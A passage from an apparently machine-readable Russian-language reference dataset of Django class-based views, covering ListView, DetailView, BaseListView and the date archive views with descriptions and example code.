    def get_queryset(self):
        qs = super().get_queryset().filter(status='published')
        q = self.request.GET.get('q')
        if q:
            qs = qs.filter(title__icontains=q)
        return qs.select_related('author').order_by('-published_at')

# urls.py
# path('articles/', ArticleList.as_view(), name='article-list')

# templates/<app>/article_list.html
# {% for article in article_list %}
#   <h2>{{ article.title }}</h2>
# {% endfor %}
# {% if is_paginated %}
#   <a href="?page={{ page_obj.next_page_number }}">Далее</a>
# {% endif %}`,
  },
  {
    name: "BaseListView",
    category: "Built-in class-based views API",
    description:
      "Базовый класс django.views.generic.list.BaseListView — реализует логику получения и пагинации списка объектов без миксина рендеринга шаблона (MultipleObjectTemplateResponseMixin). Прямой родитель ListView (= BaseListView + MultipleObjectTemplateResponseMixin). Используется для возврата списков в JSON, CSV, RSS и других нестандартных форматах.",
    syntax: `from django.views.generic.list import BaseListView

class ApiListView(BaseListView):
    model = Article
    paginate_by = 50
    def render_to_response(self, context, **kw):
        ...`,
    arguments: [],
    example: `from django.http import JsonResponse, StreamingHttpResponse
from django.views.generic.list import BaseListView
from .models import Article

# JSON-эндпоинт со списком и пагинацией
class ArticleListAPI(BaseListView):
    model = Article
    paginate_by = 25

    def get_queryset(self):
        return Article.objects.filter(status='published').order_by('-id')

    def render_to_response(self, context, **response_kwargs):
        page = context['page_obj']
        return JsonResponse({
            'results': [
                {'id': a.pk, 'title': a.title}
                for a in context['object_list']
            ],
            'pagination': {
                'page':       page.number,
                'pages':      page.paginator.num_pages,
                'total':      page.paginator.count,
                'has_next':   page.has_next(),
                'has_prev':   page.has_previous(),
            },
        })

# CSV-экспорт без шаблона
import csv
from django.http import HttpResponse

class ArticleCsvView(BaseListView):
    model = Article

    def render_to_response(self, context, **response_kwargs):
        response = HttpResponse(content_type='text/csv')
        response['Content-Disposition'] = 'attachment; filename="articles.csv"'
        writer = csv.writer(response)
        writer.writerow(['id', 'title', 'author'])
        for a in context['object_list']:
            writer.writerow([a.pk, a.title, a.author.username])
        return response

# ListView      = BaseListView + MultipleObjectTemplateResponseMixin
# BaseListView  = MultipleObjectMixin + View   (без рендеринга шаблона)`,
  },
  {
    name: "DetailView.get(request, *args, **kwargs)",
    category: "Built-in class-based views API",
    description:
      "Обработчик GET-запроса в DetailView (унаследован от BaseDetailView.get). Загружает объект через self.object = self.get_object(), формирует контекст через get_context_data() и рендерит шаблон через render_to_response(). Переопределяется редко — обычно достаточно настроить model, queryset и шаблон. Чаще переопределяют get_object()/get_queryset()/get_context_data().",
    syntax: "DetailView.get(request, *args, **kwargs)",
    arguments: [
      {
        name: "request",
        description: "Объект HttpRequest текущего GET-запроса.",
      },
      {
        name: "*args",
        description: "Позиционные аргументы из URL-резолвера.",
      },
      {
        name: "**kwargs",
        description:
          "Именованные аргументы из URL-резолвера (обычно содержат pk или slug).",
      },
    ],
    example: `from django.views.generic.detail import DetailView
from django.http import HttpResponseRedirect
from django.urls import reverse
from .models import Article

# Стандартное использование — get() переопределять обычно не нужно
class ArticleDetail(DetailView):
    model = Article

# Переопределение get(): инкремент счётчика просмотров
class ArticleDetailWithViews(DetailView):
    model = Article

    def get(self, request, *args, **kwargs):
        # super() сам загрузит self.object и отрендерит шаблон
        response = super().get(request, *args, **kwargs)
        # Увеличиваем счётчик просмотров асинхронно от рендеринга
        Article.objects.filter(pk=self.object.pk).update(
            views_count=models.F('views_count') + 1
        )
        return response

# Редирект на канонический URL, если slug не совпадает
class CanonicalArticleDetail(DetailView):
    model = Article

    def get(self, request, *args, **kwargs):
        self.object = self.get_object()
        # Если в URL устаревший slug — редирект на актуальный
        if kwargs.get('slug') != self.object.slug:
            return HttpResponseRedirect(
                reverse('article-detail', kwargs={'slug': self.object.slug})
            )
        context = self.get_context_data(object=self.object)
        return self.render_to_response(context)`,
  },
  {
    name: "BaseDetailView.get(request, *args, **kwargs)",
    category: "Built-in class-based views API",
    description:
      "Обработчик GET-запроса в BaseDetailView. Загружает объект из БД (self.object = self.get_object()), собирает контекст через get_context_data() и передаёт его в render_to_response(). В BaseDetailView render_to_response должен быть переопределён — стандартный SingleObjectTemplateResponseMixin отсутствует. Это единственный реализованный HTTP-метод в BaseDetailView (POST не поддерживается без явного добавления).",
    syntax: "BaseDetailView.get(request, *args, **kwargs)",
    arguments: [
      {
        name: "request",
        description: "Объект HttpRequest текущего GET-запроса.",
      },
      {
        name: "*args",
        description: "Позиционные аргументы из URL-резолвера.",
      },
      {
        name: "**kwargs",
        description:
          "Именованные аргументы из URL-резолвера (обычно pk или slug объекта).",
      },
    ],
    example: `from django.http import JsonResponse, Http404
from django.views.generic.detail import BaseDetailView
from .models import Article

# Стандартный BaseDetailView c JSON-ответом
class ArticleDetailAPI(BaseDetailView):
    model = Article

    def render_to_response(self, context, **response_kwargs):
        a = context['object']
        return JsonResponse({'id': a.pk, 'title': a.title})

# Переопределение get(): добавить логирование доступа
class LoggedArticleAPI(BaseDetailView):
    model = Article

    def get(self, request, *args, **kwargs):
        try:
            self.object = self.get_object()
        except Http404:
            AccessLog.objects.create(
                user=request.user, object_id=kwargs.get('pk'), result='not_found',
            )
            raise

        AccessLog.objects.create(
            user=request.user, object_id=self.object.pk, result='ok',
        )
        context = self.get_context_data(object=self.object)
        return self.render_to_response(context)

    def render_to_response(self, context, **response_kwargs):
        a = context['object']
        return JsonResponse({'id': a.pk, 'body': a.body})`,
  },
  {
    name: "ListView.get(request, *args, **kwargs)",
    category: "Built-in class-based views API",
    description:
      "Обработчик GET-запроса в ListView (унаследован от BaseListView.get). Получает queryset через self.object_list = self.get_queryset(), проверяет, что список не пустой если allow_empty=False (иначе Http404), формирует контекст с пагинацией и рендерит шаблон. Переопределяется редко — обычно настраивают model/queryset, paginate_by, ordering и get_context_data().",
    syntax: "ListView.get(request, *args, **kwargs)",
    arguments: [
      {
        name: "request",
        description:
          "Объект HttpRequest текущего GET-запроса. request.GET может содержать параметр ?page=N для пагинации.",
      },
      {
        name: "*args",
        description: "Позиционные аргументы из URL-резолвера.",
      },
      {
        name: "**kwargs",
        description: "Именованные аргументы из URL-резолвера.",
      },
    ],
    example: `from django.views.generic.list import ListView
from django.http import HttpResponseRedirect
from .models import Article

# Стандартное использование — get() переопределять обычно не нужно
class ArticleList(ListView):
    model = Article
    paginate_by = 20

# Переопределение get(): редирект на первую страницу при некорректном ?page=
class SafeArticleList(ListView):
    model = Article
    paginate_by = 20

    def get(self, request, *args, **kwargs):
        try:
            return super().get(request, *args, **kwargs)
        except Http404:
            # Невалидная страница в ?page= → редирект на 1-ю
            return HttpResponseRedirect(request.path)

# Запрет пустых результатов
class StrictList(ListView):
    model = Article
    allow_empty = False   # Http404, если queryset пуст
    paginate_by = 50`,
  },
  {
    name: "BaseListView.get(request, *args, **kwargs)",
    category: "Built-in class-based views API",
    description:
      "Обработчик GET-запроса в BaseListView. Получает queryset через self.object_list = self.get_queryset(), проверяет allow_empty, собирает контекст с paginator/page_obj/object_list и передаёт в render_to_response(). В BaseListView render_to_response должен быть переопределён вручную — стандартный MultipleObjectTemplateResponseMixin отсутствует. Это единственный реализованный HTTP-метод в BaseListView.",
    syntax: "BaseListView.get(request, *args, **kwargs)",
    arguments: [
      {
        name: "request",
        description:
          "Объект HttpRequest текущего GET-запроса. ?page=N — номер страницы пагинации.",
      },
      {
        name: "*args",
        description: "Позиционные аргументы из URL-резолвера.",
      },
      {
        name: "**kwargs",
        description: "Именованные аргументы из URL-резолвера.",
      },
    ],
    example: `from django.http import JsonResponse
from django.views.generic.list import BaseListView
from .models import Article

# Стандартный BaseListView c JSON-выдачей
class ArticleListAPI(BaseListView):
    model = Article
    paginate_by = 25

    def render_to_response(self, context, **response_kwargs):
        return JsonResponse({
            'items': [{'id': a.pk, 'title': a.title} for a in context['object_list']],
            'page':  context['page_obj'].number,
            'pages': context['paginator'].num_pages,
        })

# Переопределение get(): фильтрация по query-параметрам перед стандартной обработкой
class FilteredListAPI(BaseListView):
    model = Article
    paginate_by = 25

    def get(self, request, *args, **kwargs):
        # Можно подготовить self.q до вызова get_queryset()
        self.q = request.GET.get('q', '').strip()
        return super().get(request, *args, **kwargs)

    def get_queryset(self):
        qs = super().get_queryset()
        if self.q:
            qs = qs.filter(title__icontains=self.q)
        return qs

    def render_to_response(self, context, **response_kwargs):
        return JsonResponse({
            'q':       self.q,
            'results': list(context['object_list'].values('id', 'title')),
        })`,
  },
  {
    name: "DetailView.model",
    category: "Built-in class-based views API",
    description:
      "Класс модели Django, экземпляр которой отображается. Используется для: загрузки объекта по pk/slug из URL (через get_object() с queryset = Model.objects.all()), определения имени шаблона по умолчанию (<app>/<model>_detail.html) и имени переменной контекста (<model>, например article). Альтернатива — задать queryset для ограничения видимых объектов или переопределить get_object()/get_queryset().",
    syntax: "DetailView.model = MyModel",
    arguments: [],
    example: `from django.views.generic.detail import DetailView
from .models import Article

# Минимальный DetailView
class ArticleDetail(DetailView):
    model = Article
    # urls.py: path('articles/<int:pk>/', ArticleDetail.as_view())

# Ограничение через queryset вместо model
class PublishedArticleDetail(DetailView):
    queryset = Article.objects.filter(status='published')
    # 404 для неопубликованных статей даже если pk существует

# Поиск по slug
class ArticleDetailBySlug(DetailView):
    model = Article
    slug_field = 'slug'         # имя поля в модели
    slug_url_kwarg = 'slug'     # имя параметра в URL
    # urls.py: path('articles/<slug:slug>/', ArticleDetailBySlug.as_view())

# Кастомный context_object_name
class BookDetail(DetailView):
    model = Book
    context_object_name = 'book'   # вместо дефолтного 'book' (равно имени модели)
    # В шаблоне: {{ book.title }} (а также всегда доступно {{ object }})`,
  },
  {
    name: "ListView.model",
    category: "Built-in class-based views API",
    description:
      "Класс модели Django, объекты которой отображаются в списке. Используется для: формирования queryset по умолчанию (Model.objects.all()), определения имени шаблона (<app>/<model>_list.html) и имени переменной контекста (<model>_list — например, article_list). Альтернатива — задать queryset напрямую для встроенной фильтрации/сортировки или переопределить get_queryset() для произвольной логики.",
    syntax: "ListView.model = MyModel",
    arguments: [],
    example: `from django.views.generic.list import ListView
from .models import Article

# Минимальный ListView
class ArticleList(ListView):
    model = Article
    paginate_by = 20
    # В шаблоне: {{ article_list }} или {{ object_list }}

# queryset вместо model — встроенная фильтрация и сортировка
class PublishedArticleList(ListView):
    queryset = (
        Article.objects.filter(status='published')
        .select_related('author')
        .order_by('-published_at')
    )
    paginate_by = 20

# Динамическое получение через get_queryset() — фильтр по параметру URL
class CategoryArticleList(ListView):
    model = Article
    paginate_by = 20

    def get_queryset(self):
        return Article.objects.filter(category__slug=self.kwargs['category_slug'])
    # urls.py: path('cat/<slug:category_slug>/', CategoryArticleList.as_view())

# Кастомное имя в контексте
class BookList(ListView):
    model = Book
    context_object_name = 'books'   # вместо дефолтного 'book_list'
    # В шаблоне: {% for book in books %}{{ book }}{% endfor %}`,
  },
  {
    name: "ListView.paginate_by",
    category: "Built-in class-based views API",
    description:
      "Целое число — количество объектов на одной странице пагинации. При указании активирует постраничный вывод: в контексте появляются paginator (django.core.paginator.Paginator), page_obj (текущая Page) и булево is_paginated. Текущая страница берётся из ?page=N (по умолчанию ?page=1). При невалидном номере страницы (строка, отрицательное число, выход за пределы) вызывается Http404, если не задан page_kwarg или paginate_orphans.",
    syntax: "ListView.paginate_by = 20",
    arguments: [],
    example: `from django.views.generic.list import ListView
from .models import Article

# Простая пагинация по 20 объектов
class ArticleList(ListView):
    model = Article
    paginate_by = 20
    ordering = ['-created_at']     # обязательно для стабильной пагинации
    paginate_orphans = 3           # последняя страница объединяется,
                                   # если на ней <= 3 объектов
    page_kwarg = 'page'            # имя параметра запроса (по умолчанию 'page')

# Динамический размер страницы из URL
class FlexibleList(ListView):
    model = Article

    def get_paginate_by(self, queryset):
        # ?per_page=50  →  50 объектов на страницу
        try:
            return min(int(self.request.GET.get('per_page', 20)), 100)
        except ValueError:
            return 20

# templates/<app>/article_list.html
# <ul>
#   {% for article in article_list %}
#     <li>{{ article.title }}</li>
#   {% endfor %}
# </ul>
# {% if is_paginated %}
#   <nav>
#     {% if page_obj.has_previous %}
#       <a href="?page={{ page_obj.previous_page_number }}">←</a>
#     {% endif %}
#     Стр. {{ page_obj.number }} из {{ paginator.num_pages }}
#     {% if page_obj.has_next %}
#       <a href="?page={{ page_obj.next_page_number }}">→</a>
#     {% endif %}
#   </nav>
# {% endif %}`,
  },
  {
    name: "DetailView.get_context_data(**kwargs)",
    category: "Built-in class-based views API",
    description:
      "Метод, формирующий словарь контекста для шаблона DetailView. Стандартная реализация (SingleObjectMixin) добавляет ключи object (загруженный объект) и <model_name> (псевдоним по имени модели или context_object_name). Переопределяется для добавления связанных данных: списка комментариев, похожих объектов, формы и т. п. Обязательно вызывать super().get_context_data(**kwargs), чтобы не потерять object.",
    syntax: "DetailView.get_context_data(**kwargs)",
    arguments: [
      {
        name: "**kwargs",
        description:
          "Именованные аргументы. Внутри вызова self.object = self.get_object() уже выполнен; передаются дальше в super().get_context_data(**kwargs).",
      },
    ],
    example: `from django.views.generic.detail import DetailView
from .models import Article, Comment
from .forms import CommentForm

class ArticleDetail(DetailView):
    model = Article
    template_name = 'articles/detail.html'

    def get_context_data(self, **kwargs):
        ctx = super().get_context_data(**kwargs)
        # Связанные комментарии и форма для нового комментария
        ctx['comments'] = (
            Comment.objects.filter(article=self.object)
            .select_related('author')
            .order_by('created_at')
        )
        ctx['comment_form'] = CommentForm()
        # Похожие статьи по категории
        ctx['related'] = (
            Article.objects.filter(category=self.object.category)
            .exclude(pk=self.object.pk)[:5]
        )
        return ctx

# templates/articles/detail.html
# <h1>{{ article.title }}</h1>
# <p>{{ article.body }}</p>
#
# <h2>Комментарии ({{ comments|length }})</h2>
# {% for c in comments %}
#   <div>{{ c.author }}: {{ c.text }}</div>
# {% endfor %}
#
# <h2>Похожие</h2>
# {% for r in related %}<a href="{{ r.get_absolute_url }}">{{ r.title }}</a>{% endfor %}`,
  },
  {
    name: "ListView.get_context_data(**kwargs)",
    category: "Built-in class-based views API",
    description:
      "Метод, формирующий словарь контекста для шаблона ListView. Стандартная реализация (MultipleObjectMixin) добавляет ключи object_list (queryset страницы), <model>_list (псевдоним), paginator, page_obj и is_paginated. Переопределяется для добавления вспомогательных данных: фильтров, активной категории, общего количества, дополнительных списков и т. п. Обязательно вызывать super().get_context_data(**kwargs).",
    syntax: "ListView.get_context_data(**kwargs)",
    arguments: [
      {
        name: "**kwargs",
        description:
          "Именованные аргументы. Внутри метода уже доступны self.object_list (queryset) и self.kwargs из URL. Передаются дальше в super().get_context_data(**kwargs).",
      },
    ],
    example: `from django.views.generic.list import ListView
from .models import Article, Category

class ArticleList(ListView):
    model = Article
    paginate_by = 20

    def get_queryset(self):
        qs = Article.objects.filter(status='published')
        self.q = self.request.GET.get('q', '')
        if self.q:
            qs = qs.filter(title__icontains=self.q)
        return qs.order_by('-published_at')

    def get_context_data(self, **kwargs):
        ctx = super().get_context_data(**kwargs)
        # Дополнительные данные для боковой панели и фильтров
        ctx['categories']     = Category.objects.all()
        ctx['active_query']   = self.q
        ctx['total_articles'] = self.object_list.count()
        ctx['popular']        = Article.objects.order_by('-views')[:5]
        return ctx

# templates/<app>/article_list.html
# <input value="{{ active_query }}" name="q">
# <p>Найдено: {{ total_articles }}</p>
# <ul>
#   {% for article in article_list %}
#     <li>{{ article.title }}</li>
#   {% endfor %}
# </ul>
# <aside>
#   <h3>Категории</h3>
#   {% for c in categories %}<a href="?cat={{ c.slug }}">{{ c.name }}</a>{% endfor %}
# </aside>`,
  },
  {
    name: "DetailView.as_view(**initkwargs)",
    category: "Built-in class-based views API",
    description:
      "Classmethod (унаследован от View), возвращающий callable view-функцию для подключения в URLconf. Принимает именованные аргументы, переопределяющие атрибуты класса для каждого экземпляра DetailView (model, queryset, template_name, context_object_name, slug_field, slug_url_kwarg, pk_url_kwarg и пр.). Позволяет конфигурировать одно и то же представление под разные URL-маршруты прямо в urls.py, без создания подклассов.",
    syntax: "DetailView.as_view(**initkwargs)",
    arguments: [
      {
        name: "**initkwargs",
        description:
          "Именованные аргументы — атрибуты класса DetailView: model, queryset, template_name, context_object_name, slug_field, slug_url_kwarg, pk_url_kwarg и т. п. Только существующие атрибуты допустимы.",
      },
    ],
    example: `from django.urls import path
from django.views.generic.detail import DetailView
from .models import Article, Book

urlpatterns = [
    # 1. Минимально — только модель
    path(
        'articles/<int:pk>/',
        DetailView.as_view(model=Article),
        name='article-detail',
    ),

    # 2. Поиск по slug + кастомный шаблон
    path(
        'articles/<slug:slug>/',
        DetailView.as_view(
            model=Article,
            slug_field='slug',
            slug_url_kwarg='slug',
            template_name='articles/article_detail.html',
        ),
    ),

    # 3. Ограничение видимости через queryset + кастомное имя в контексте
    path(
        'books/<int:pk>/',
        DetailView.as_view(
            queryset=Book.objects.filter(is_active=True),
            context_object_name='book',
            template_name='books/page.html',
        ),
    ),
]

# Эквивалентно созданию подкласса:
# class ArticleDetail(DetailView):
#     model = Article
#     template_name = 'articles/article_detail.html'`,
  },
  {
    name: "ListView.as_view(**initkwargs)",
    category: "Built-in class-based views API",
    description:
      "Classmethod (унаследован от View), возвращающий callable view-функцию для подключения в URLconf. Принимает именованные аргументы, переопределяющие атрибуты класса для каждого экземпляра ListView (model, queryset, paginate_by, ordering, template_name, context_object_name, allow_empty, paginate_orphans, page_kwarg и пр.). Позволяет создавать несколько вариантов списка из одного класса прямо в urls.py.",
    syntax: "ListView.as_view(**initkwargs)",
    arguments: [
      {
        name: "**initkwargs",
        description:
          "Именованные аргументы — атрибуты класса ListView: model, queryset, paginate_by, ordering, template_name, context_object_name, allow_empty, paginate_orphans, page_kwarg и т. п.",
      },
    ],
    example: `from django.urls import path
from django.views.generic.list import ListView
from .models import Article

urlpatterns = [
    # 1. Минимально — модель и пагинация
    path(
        'articles/',
        ListView.as_view(model=Article, paginate_by=20),
        name='article-list',
    ),

    # 2. Только опубликованные, кастомный шаблон и сортировка
    path(
        'articles/published/',
        ListView.as_view(
            queryset=Article.objects.filter(status='published'),
            ordering=['-published_at'],
            paginate_by=10,
            template_name='articles/published_list.html',
            context_object_name='articles',
        ),
        name='article-published',
    ),

    # 3. Архив без пагинации, с запретом пустого результата
    path(
        'articles/archive/',
        ListView.as_view(
            queryset=Article.objects.filter(status='archived'),
            allow_empty=False,
            template_name='articles/archive.html',
        ),
    ),
]

# Эквивалентно созданию подкласса:
# class PublishedArticleList(ListView):
#     queryset = Article.objects.filter(status='published')
#     paginate_by = 10
#     ...`,
  },
  {
    name: "ArchiveIndexView",
    category: "Built-in class-based views API",
    description:
      "Класс django.views.generic.dates.ArchiveIndexView — главная страница архива по дате: последние объекты модели, отсортированные по убыванию date_field. Объекты «в будущем» по умолчанию исключаются (allow_future=False). Шаблон по умолчанию — <app>/<model>_archive.html. В контексте: latest (срез последних объектов, размер задаёт date_list_period) и date_list (агрегированный список периодов через QuerySet.dates()).",
    syntax: `from django.views.generic.dates import ArchiveIndexView

class ArticleArchive(ArchiveIndexView):
    model = Article
    date_field = 'published_at'`,
    arguments: [],
    example: `from django.views.generic.dates import ArchiveIndexView
from .models import Article

class ArticleArchive(ArchiveIndexView):
    model = Article
    date_field = 'published_at'    # обязательный атрибут
    date_list_period = 'year'      # 'year' | 'month' | 'day' (для date_list)
    allow_empty = True             # иначе 404 при пустой выборке
    allow_future = False           # скрыть объекты с датой > сейчас
    template_name = 'blog/archive.html'

# urls.py
# path('archive/', ArticleArchive.as_view(), name='article-archive')

# templates/blog/archive.html
# <h1>Архив статей</h1>
# <h2>По годам</h2>
# <ul>
#   {% for year in date_list %}
#     <li><a href="{{ year|date:'Y' }}/">{{ year|date:'Y' }}</a></li>
#   {% endfor %}
# </ul>
# <h2>Последние</h2>
# {% for article in latest %}
#   <article><h3>{{ article.title }}</h3></article>
# {% endfor %}`,
  },
  {
    name: "YearArchiveView",
    category: "Built-in class-based views API",
    description:
      "Класс django.views.generic.dates.YearArchiveView — страница архива за указанный год. Год берётся из параметра URL year (kwarg). По умолчанию НЕ загружает список объектов (make_object_list=False) — возвращает только список месяцев (date_list), в к �торых есть публикации. Чтобы получить полный список объектов года в шаблон, установите make_object_list=True. Шаблон по умолчанию — <app>/<model>_archive_year.html.",
    syntax: `from django.views.generic.dates import YearArchiveView

class ArticleYearArchive(YearArchiveView):
    model = Article
    date_field = 'published_at'
    make_object_list = True`,
    arguments: [],
    example: `from django.views.generic.dates import YearArchiveView
from .models import Article

class ArticleYearArchive(YearArchiveView):
    model = Article
    date_field = 'published_at'
    make_object_list = True        # включить object_list в контекст
    allow_future = False
    paginate_by = 50               # пагинация работает только при make_object_list

# urls.py
# path('archive/<int:year>/', ArticleYearArchive.as_view(), name='article-year')

# В контексте шаблона:
#   year         — datetime.date(год, 1, 1)
#   next_year    — datetime.date(год+1, 1, 1) или None (если allow_future=False)
#   previous_year — datetime.date(год-1, 1, 1)
#   date_list    — QuerySet[date] — месяцы с публикациями
#   object_list  — список статей за год (только при make_object_list=True)

# templates/<app>/article_archive_year.html
# <h1>Статьи за {{ year|date:'Y' }}</h1>
# {% if previous_year %}<a href="../{{ previous_year|date:'Y' }}/">←</a>{% endif %}
# {% if next_year %}<a href="../{{ next_year|date:'Y' }}/">→</a>{% endif %}
# <h2>Месяцы</h2>
# {% for m in date_list %}<a href="{{ m|date:'m' }}/">{{ m|date:'F' }}</a>{% endfor %}
# {% for article in object_list %}<h3>{{ article.title }}</h3>{% endfor %}`,
  },
  {
    name: "YearArchiveView.make_object_list",
    category: "Built-in class-based views API",
    description:
      "Логический атрибут (по умолчанию False), управляющий тем, нужно ли загружать в контекст полный список объектов за год (object_list). При False загружается только агрегированный date_list (месяцы с публикациями) — это экономит запросы для больших архивов. При True работает как обычный ListView с пагинацией. Атрибут уникален для YearArchiveView; в других *ArchiveView (Month/Week/Day) объекты загружаются всегда.",
    syntax: "YearArchiveView.make_object_list = True",
    arguments: [],
    example: `from django.views.generic.dates import YearArchiveView
from .models import Article

# Лёгкая страница: только список месяцев (по умолчанию)
class LightYearArchive(YearArchiveView):
    model = Article
    date_field = 'published_at'
    # make_object_list = False (default)
    # В контексте: date_list, year, next_year, previous_year
    # object_list = None — пагинация не работает

# Полный архив с пагинацией
class FullYearArchive(YearArchiveView):
    model = Article
    date_field = 'published_at'
    make_object_list = True
    paginate_by = 25
    # В контексте: + object_list, + paginator, + page_obj, + is_paginated

# templates/<app>/article_archive_year.html
# {% if object_list %}
#   {% for article in object_list %}
#     <article>{{ article.title }}</article>
#   {% endfor %}
# {% else %}
#   <p>Только список месяцев (object_list не загружался):</p>
#   {% for m in date_list %}<a href="{{ m|date:'m' }}/">{{ m|date:'F' }}</a>{% endfor %}
# {% endif %}`,
  },
  {
    name: "YearArchiveView.get_make_object_list()",
    category: "Built-in class-based views API",
    description:
      "Метод, возвращающий булево значение для make_object_list. Стандартная реализация просто возвращает self.make_object_list. Переопределяется для динамического выбора: грузить полный список объектов или только date_list — в зависимости от пользователя, query-параметра, размера выборки и т. п. Вызывается из get_dated_items() при подготовке контекста.",
    syntax: "YearArchiveView.get_make_object_list()",
    arguments: [],
    example: `from django.views.generic.dates import YearArchiveView
from .models import Article

# Динамический выбор: ?full=1 — полный список, иначе только месяцы
class FlexibleYearArchive(YearArchiveView):
    model = Article
    date_field = 'published_at'
    paginate_by = 25

    def get_make_object_list(self):
        return self.request.GET.get('full') == '1'

# Загружать object_list только для администраторов
class AdminYearArchive(YearArchiveView):
    model = Article
    date_field = 'published_at'

    def get_make_object_list(self):
        return self.request.user.is_staff

# Загружать только если в году не слишком много объектов
class SmartYearArchive(YearArchiveView):
    model = Article
    date_field = 'published_at'

    def get_make_object_list(self):
        year = int(self.kwargs['year'])
        count = Article.objects.filter(published_at__year=year).count()
        return count <= 100   # для больших годов — только агрегаты`,
  },
  {
    name: "MonthArchiveView",
    category: "Built-in class-based views API",
    description:
      'Класс django.views.generic.dates.MonthArchiveView — страница архива за указанный месяц. Месяц и год берутся из параметров URL year и month (kwarg). По умолчанию формат месяца — три буквы в нижнем регистре (jan, feb, ...), задаётся через month_format ("%m" — числовой, "%b" — abbr, "%B" — полное имя). В контексте: object_list (статьи месяца), month/next_month/previous_month (datetime.date) и date_list (дни месяца с публикациями).',
    syntax: `from django.views.generic.dates import MonthArchiveView

class ArticleMonthArchive(MonthArchiveView):
    model = Article
    date_field = 'published_at'
    month_format = '%m'`,
    arguments: [],
    example: `from django.views.generic.dates import MonthArchiveView
from .models import Article

class ArticleMonthArchive(MonthArchiveView):
    model = Article
    date_field = 'published_at'
    month_format = '%m'         # числовой месяц 01-12 (по умолчанию '%b' = jan, feb…)
    allow_future = False
    paginate_by = 20

# urls.py
# path('archive/<int:year>/<int:month>/',
#      ArticleMonthArchive.as_view(), name='article-month')

# В контексте шаблона:
#   month          — datetime.date(год, месяц, 1)
#   next_month     — следующий месяц с публикациями (или None)
#   previous_month — предыдущий месяц с публикациями (или None)
#   date_list      — QuerySet[date] — дни месяца с публикациями
#   object_list    — статьи месяца

# templates/<app>/article_archive_month.html
# <h1>{{ month|date:'F Y' }}</h1>
# {% if previous_month %}
#   <a href="../../{{ previous_month|date:'Y/m' }}/">← {{ previous_month|date:'F' }}</a>
# {% endif %}
# {% for article in object_list %}
#   <p><a href="{{ article.get_absolute_url }}">{{ article.title }}</a></p>
# {% endfor %}`,
  },
  {
    name: "WeekArchiveView",
    category: "Built-in class-based views API",
    description:
      'Класс django.views.generic.dates.WeekArchiveView — страница архива за указанную неделю. Год и номер недели берутся из URL-параметров year и week. Атрибут week_format задаёт способ нумерации: "%U" — неделя начинается с воскресенья (по умолчанию), "%W" — с понедельника, "%V" — ISO 8601 (тогда year должен быть из "%G"). В контексте: object_list (статьи недели), week (datetime.date — первый день недели), next_week/previous_week.',
    syntax: `from django.views.generic.dates import WeekArchiveView

class ArticleWeekArchive(WeekArchiveView):
    model = Article
    date_field = 'published_at'
    week_format = '%W'`,
    arguments: [],
    example: `from django.views.generic.dates import WeekArchiveView
from .models import Article

class ArticleWeekArchive(WeekArchiveView):
    model = Article
    date_field = 'published_at'
    week_format = '%W'         # %U (вс), %W (пн), %V (ISO 8601)
    allow_future = False

# urls.py
# path('archive/<int:year>/week/<int:week>/',
#      ArticleWeekArchive.as_view(), name='article-week')

# В контексте шаблона:
#   week          — datetime.date — первый день недели
#   next_week     — следующая непустая неделя (или None)
#   previous_week — предыдущая непустая неделя (или None)
#   object_list   — статьи недели

# templates/<app>/article_archive_week.html
# <h1>Неделя с {{ week|date:'d.m.Y' }}</h1>
# {% if previous_week %}
#   <a href="?week={{ previous_week|date:'W' }}">← Пред.</a>
# {% endif %}
# {% for article in object_list %}
#   <h3>{{ article.title }} — {{ article.published_at|date:'l' }}</h3>
# {% endfor %}`,
  },
  {
    name: "DayArchiveView",
    category: "Built-in class-based views API",
    description:
      'Класс django.views.generic.dates.DayArchiveView — страница архива за указанный день. Дата берётся из URL-параметров year, month, day. Формат месяца настраивается через month_format, дня — через day_format ("%d" по умолчанию). В контексте: object_list (статьи дня), day (datetime.date), next_day/previous_day, month/next_month/previous_month.',
    syntax: `from django.views.generic.dates import DayArchiveView

class ArticleDayArchive(DayArchiveView):
    model = Article
    date_field = 'published_at'
    month_format = '%m'`,
    arguments: [],
    example: `from django.views.generic.dates import DayArchiveView
from .models import Article

class ArticleDayArchive(DayArchiveView):
    model = Article
    date_field = 'published_at'
    month_format = '%m'        # числовой формат месяца
    day_format = '%d'          # числовой формат дня (по умолчанию)
    allow_future = False
    paginate_by = 30

# urls.py
# path('archive/<int:year>/<int:month>/<int:day>/',
#      ArticleDayArchive.as_view(), name='article-day')

# В контексте шаблона:
#   day            — datetime.date(год, месяц, день)
#   next_day       — следующий непустой день (или None)
#   previous_day   — предыдущий непустой день (или None)
#   month          — datetime.date(год, месяц, 1)
#   object_list    — статьи дня

# templates/<app>/article_archive_day.html
# <h1>{{ day|date:'j F Y' }}</h1>
# <nav>
#   {% if previous_day %}
#     <a href="/archive/{{ previous_day|date:'Y/m/d' }}/">←</a>
#   {% endif %}
#   {% if next_day %}
#     <a href="/archive/{{ next_day|date:'Y/m/d' }}/">→</a>
#   {% endif %}
# </nav>
# {% for article in object_list %}
#   <article>{{ article.title }}</article>
# {% endfor %}`,
  },
  {
    name: "TodayArchiveView",
    category: "Built-in class-based views API",
    description:
      "Класс django.views.generic.dates.TodayArchiveView — частный случай DayArchiveView, отображающий объекты, опубликованные сегодня. Не требует параметров в URL — дата берётся из datetime.date.today(). Удобен для страницы «Сегодняшние новости» / «Today's posts». Шаблон по умолчанию совпадает с DayArchiveView: <app>/<model>_archive_day.html.",
    syntax: `from django.views.generic.dates import TodayArchiveView

class ArticleToday(TodayArchiveView):
    model = Article
    date_field = 'published_at'`,
    arguments: [],
    example: `from django.views.generic.dates import TodayArchiveView
from .models import Article

class ArticleToday(TodayArchiveView):
    model = Article
    date_field = 'published_at'
    allow_empty = True            # без 404, если за сегодня нет публикаций
    template_name = 'blog/today.html'

# urls.py — без параметров year/month/day
# path('today/', ArticleToday.as_view(), name='article-today')

# В контексте шаблона: те же ключи, что и у DayArchiveView
#   day            — datetime.date.today()
#   previous_day   — предыдущий непустой день
#   next_day       — обычно None (сегодня в будущем уже ничего нет)
#   object_list    — статьи за сегодня

# templates/blog/today.html
# <h1>Сегодня — {{ day|date:'l, j F' }}</h1>
# {% if object_list %}
#   {% for article in object_list %}
#     <article><h2>{{ article.title }}</h2></article>
#   {% endfor %}
# {% else %}
#   <p>Сегодня пока ничего не опубликовано.</p>
#   {% if previous_day %}
#     <a href="/archive/{{ previous_day|date:'Y/m/d' }}/">
#       ← {{ previous_day|date:'j F' }}
#     </a>
#   {% endif %}
# {% endif %}`,
  },
  {
    name: "DateDetailView",
    category: "Built-in class-based views API",
    description:
